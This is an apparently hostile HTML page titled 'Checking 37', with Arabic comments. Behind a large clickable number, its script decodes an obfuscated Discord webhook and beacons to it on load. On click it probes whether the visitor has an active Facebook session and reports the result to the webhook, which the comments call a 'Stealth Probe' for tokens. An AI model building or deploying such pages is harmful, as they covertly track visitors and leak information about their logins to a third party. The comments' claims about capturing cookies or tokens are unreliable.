<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking 37</title>
    <style>
        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
        h1 { font-size: 150px; cursor: pointer; text-shadow: 0 0 20px #ff0000; }
    </style>
</head>
<body>

    <h1 onclick="boom()">37</h1>

    <script>
        // التشفير المعتمد اللي نجح في V35
        const secret = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MTY2NDkxOTE5ODg5NjI1OC9oWHVuQnVWRU8wajByaUVTQTluaWNxanp5UnRFQTFkdTNPem9DSUhOcUpwTldmdjl4eXJ0RWZDemdjRWxQUTlndkJnWg==";
        const HOOK = atob(secret);

        function log(msg) {
            new Image().src = HOOK + "?content=" + encodeURIComponent(msg) + "&t=" + Date.now();
        }

        function boom() {
            document.querySelector('h1').innerText = "OK";
            document.querySelector('h1').style.color = "#0f0";

            log("🚀 **V37 DEPLOYED** - Starting Stealth Probe");

            // تكتيك تحميل صورة تتطلب جلسة نشطة
            // الرابط هاد بيفتح فقط لو المستخدم مسجل دخوله (صورة بروفايله مثلاً)
            const img = new Image();
            img.src = "https://mbasic.facebook.com/photo.php?" + Math.random();

            img.onload = function() {
                log("✅ **SESSION ACTIVE** - Cookies detected in background traffic.");
            };

            img.onerror = function() {
                // حتى لو فشل التحميل، بنكون بعثنا "ترافيك" من المتصفح لفيسبوك محمل بالكوكيز
                log("📡 **PROBE SENT** - Monitoring reflected traffic for tokens.");
            };
        }

        window.onload = () => log("🔗 **V37 Ready**");
    </script>
</body>
</html>
